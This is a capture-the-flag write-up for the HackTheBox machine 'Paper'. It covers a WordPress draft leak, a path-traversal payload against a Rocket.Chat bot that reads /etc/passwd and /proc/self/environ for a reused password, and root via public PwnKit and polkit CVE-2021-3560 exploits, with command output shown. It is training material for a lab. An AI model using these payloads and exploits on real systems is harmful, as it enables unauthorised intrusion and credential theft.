# User
Paper is an easy rated machine on HackTheBox created by [secnigma](https://www.hackthebox.com/home/users/profile/92926). For the user part we will abuse an information leak through a CVE in wordpress to register an account in a rocket chat installation. In rocket chat a bot is vulnerable to LFI which gets us a password that is reused for the user dwight. In the root stage we will go over the unintended method of using pkexec and the intended one of abusing polkit to add another user with sudo rights and root the machine.

## Nmap

As usual we start our enumeration with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.

`All ports`
```
$ sudo nmap -n -p- -T4 10.129.158.20

## Wordpress draft

From the open ports http and https seem to be most promising. Opening port 80 in our browser we see the the Centos http server test page.

[![005_home](/img/paper/005_home.png)](/img/paper/005_home.png)

Intercepting a request in burp and looking at the response headers in repeater we can find that it leaks the vhost `office.paper` which we add to our `/etc/hosts` file.

[![010_vhost_leak](/img/paper/010_vhost_leak.png)](/img/paper/010_vhost_leak.png)

Opening `http://office.paper` in our browser we see a wordpress blog.

[![015_vhost_home](/img/paper/015_vhost_home.png)](/img/paper/015_vhost_home.png)

Scanning the page using `wpscan` we can identify the version to be `5.3` and thus out of date.

```
$ wpscan --url http://office.paper/  -e u

Checking for vulnerabilities in the installed version we find [this](https://wpscan.com/vulnerability/9909) describing an easy way to leak drafts. Using it as described with `asc` sorting it we get an error, however changing it to `desc` we get a draft leaking a rocket chat installation with the secret registration url.

## Rocket chat LFI

After adding `chat.office.paper` to our `/etc/hosts` aswell and opening the registration link in our browser we are able to register an account on rocket chat.

[![025_rocket_chat_register](/img/paper/025_rocket_chat_register.png)](/img/paper/025_rocket_chat_register.png)

Once logged in with the created account there is an interesting discussion in general where we see some bot functionality. Especially the file retrieval seems to be interesting.

[![030_rocket_chat_general](/img/paper/030_rocket_chat_general.png)](/img/paper/030_rocket_chat_general.png)

Starting a private conversation with the bot and testing if we can go back to the file system root with `../` it works and we are able to retrieve the `/etc/passwd` file.

[![035_recyclops_files](/img/paper/035_recyclops_files.png)](/img/paper/035_recyclops_files.png)

Checking the environment parameters of rocket chat with  `recyclops file ../../../../proc/self/environ` we find the installation is running from the user dwight's home directory and we also get the password.

[![040_rocket_chat_environ](/img/paper/040_rocket_chat_environ.png)](/img/paper/040_rocket_chat_environ.png)

Testing for password reuse over ssh we are able to log into the machine and grab the user flag.

```
$ ssh dwight@office.paper
dwight@office.paper's password:
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ wc -c user.txt
33 user.txt
```


# Root

## pkexec
Until some time after release there was an unintended way to obtain root abusing a vulnerable `pkexec` version.
Checking for suid binaries we can see that `pkexec` is installed on the machine.

```
[dwight@paper ~]$ find / -perm -4000 2>/dev/null
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/fusermount3
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/qemu-bridge-helper
/usr/libexec/cockpit-session
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/proxy_child
/usr/libexec/sssd/selinux_child
/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
/usr/libexec/Xorg.wrap
```

Retrieving it's version we see it is vulnerable to the recent [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt).

```
[dwight@paper ~]$ pkexec --version
pkexec version 0.115
```

We can use [this PoC](https://github.com/luijait/PwnKit-Exploit) to exploit pkexec and obtain root on the machine.
Since make is installed on the machine we clone the repo tar it up and scp it to the target as dwight.

```
$ git clone https://github.com/luijait/PwnKit-Exploit

```

There we unpack the archive and "make" the binary.

```
[dwight@paper tmp]$ tar -xf PwnKit-Exploit.tar.gz
[dwight@paper tmp]$ cd PwnKit-Exploit/
[dwight@paper PwnKit-Exploit]$ make
cc -Wall    exploit.c   -o exploit
```

Running the exploit we get dropped into a root shell.

```
[dwight@paper PwnKit-Exploit]$ ./exploit
Current User before execute exploit
hacker@victim$whoami: dwight
Exploit written by @luijait (0x6c75696a616974)
[+] Enjoy your root if exploit was completed succesfully
[root@paper PwnKit-Exploit]# wc -c /root/root.txt
33 /root/root.txt
```

## Polkit

The actually intended solution to obtain root on the machine was to abuse polkit. Checking for the installed version we can see that it is vulnerable to [CVE-2021-3560](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/).

```
[dwight@paper ~]$ rpm -qa | grep -i polkit
polkit-0.115-6.el8.x86_64
polkit-pkla-compat-0.1-12.el8.x86_64
polkit-libs-0.115-6.el8.x86_64
```

Using the [authors poc script](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) we are able to create a new user with sudo rights and add the root flag to our collection. Note that this exploit is because of its time based nature not completely stable and might need rerunning until it works.

```
[dwight@paper tmp]$ ./poc.sh -u=sm1l3z -p=sm1l3z

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for sm1l3z:
